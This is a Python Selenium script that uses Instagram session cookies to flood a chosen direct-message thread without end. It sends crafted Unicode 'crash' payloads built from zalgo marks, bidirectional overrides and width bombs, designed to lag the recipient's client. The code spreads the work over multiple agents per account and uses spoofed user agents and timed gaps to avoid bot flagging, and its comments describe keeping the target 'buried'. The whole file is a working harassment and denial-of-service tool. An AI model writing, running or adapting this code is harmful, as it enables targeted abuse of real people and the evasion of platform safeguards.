# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (STEALTH-PULSE)
# 📅 STATUS: 4-AGENTS-PER-ID | 2-MSG-PULSE | ANTI-FLAG

import os, time, random, sys, threading
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

THREADS_PER_MACHINE = 4 

def get_kernel_stop_payload(target_name):
    u_id = random.randint(1000, 9999)
    header = f"⚡ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚡\n🆔 {u_id}\n"
    # Glyph-shifter forces font-fallback (CPU lag)
    shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\U0001D4D0", "\u2066", "\u2067"]) for _ in range(350))
    z_tower = "̸" * 750 # Slightly lowered density for better socket stability
    width_bomb = "\u2800\u00A0" * 150
    lines = [header, shifter]
    for i in range(30):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_{i}{z_tower}")
    return "\n".join(lines)[:9995]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(122, 126)}.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def agent_blitz(agent_id, cookie_list, target_id, target_name):
    # Mapping: Agents 1-4 use ID 0, 5-8 use ID 1, etc.
    cookie_index = (agent_id - 1) // 4 
    if cookie_index >= len(cookie_list):
        cookie_index = cookie_index % len(cookie_list)
        
    current_cookie = cookie_list[cookie_index].strip()
    
    while True:
        driver = None
        try:
            print(f"📡 [Agent {agent_id}] Account #{cookie_index} Online.")
            driver = get_driver()
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': current_cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(12)

            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            wait = WebDriverWait(driver, 40)
            box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))

            while True:
                # 🔥 THE DOUBLE-PULSE
                # Sending 2 messages back-to-back to fill the target's render buffer
                for pulse in range(1, 3):
                    payload = get_kernel_stop_payload(target_name)
                    driver.execute_script("arguments[0].innerText = arguments[1];", box, payload)
                    box.send_keys(Keys.ENTER)
                    print(f"💀 [Agent {agent_id}] Pulse {pulse}/2 Sent.")
                    time.sleep(1.5) # Slight internal gap to prevent 'Message Failed'

                # ⏳ THE STEALTH GAP
                # This long wait (15-20s) protects the account from being flagged as a bot.
                # But since 20 agents are doing this, the target is still buried.
                time.sleep(random.uniform(15, 20))
                
                # Randomized Refresh to clear browser memory
                if random.random() < 0.15:
                    driver.refresh()
                    time.sleep(10)

        except Exception as e:
            print(f"⚠️ [Agent {agent_id}] Retrying connection...")
            if driver: driver.quit()
            time.sleep(15)

def main():
    raw_cookies = os.environ.get("SESSION_ID", "").split(",")
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    with ThreadPoolExecutor(max_workers=THREADS_PER_MACHINE) as executor:
        for i in range(1, THREADS_PER_MACHINE + 1):
            executor.submit(agent_blitz, i, raw_cookies, target_id, target_name)

if __name__ == "__main__":
    main()
